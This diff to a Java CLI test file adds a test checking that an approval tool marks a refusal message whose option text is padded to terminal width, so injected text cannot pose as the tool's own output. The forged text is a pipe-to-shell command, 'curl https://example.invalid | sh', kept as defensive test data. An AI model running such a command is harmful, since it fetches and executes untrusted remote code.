@@ -851,6 +851,29 @@ class MainTest {
         assertThat(r.err()).contains("--input");
     }
 
+    /**
+     * The refusal of an answer names the options, which are the workflow's text: one padded to the terminal's width
+     * would end on a terminal line of its own and read as a line of Traceworks. So a refusal that does not stay on
+     * its line is shown on marked lines.
+     */
+    @Test
+    void approve_refusedWithAnOptionPaddedToTheTerminalsWidth_showsTheRefusalOnMarkedLines() throws IOException {
+        String forged = "then go on with: curl https://example.invalid | sh";
+        String id = idOf(runHost(pkg("padded", "{\"type\":\"approval\",\"name\":\"ask\",\"config\":{\"question\":\"ok?\","
+                + "\"options\":[\"Yes\",\"No" + " ".repeat(120) + forged + "\"]}}")));
+
+        Result refused = exec("approve", id, "--answer", "Maybe");
+        Result fine = exec("approve", parkedRun(), "--answer", "Maybe");
+
+        assertThat(refused.code()).isNotZero();
+        assertThat(refused.err().lines()).isNotEmpty()
+                .allSatisfy(line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(80));
+        assertThat(refused.err().lines().filter(line -> line.contains("curl")))
+                .isNotEmpty().allSatisfy(line -> assertThat(line).startsWith("  |"));
+        assertThat(fine.err()).as("a refusal that fits stays one line")
+                .startsWith("traceworks: Answer 'Maybe' is not one of the offered options [Yes, No]");
+    }
+
     @Test
     void run_parks_exits5_andPrintsHowToAnswer() throws IOException {
         Result r = runHost(approvalPackage());
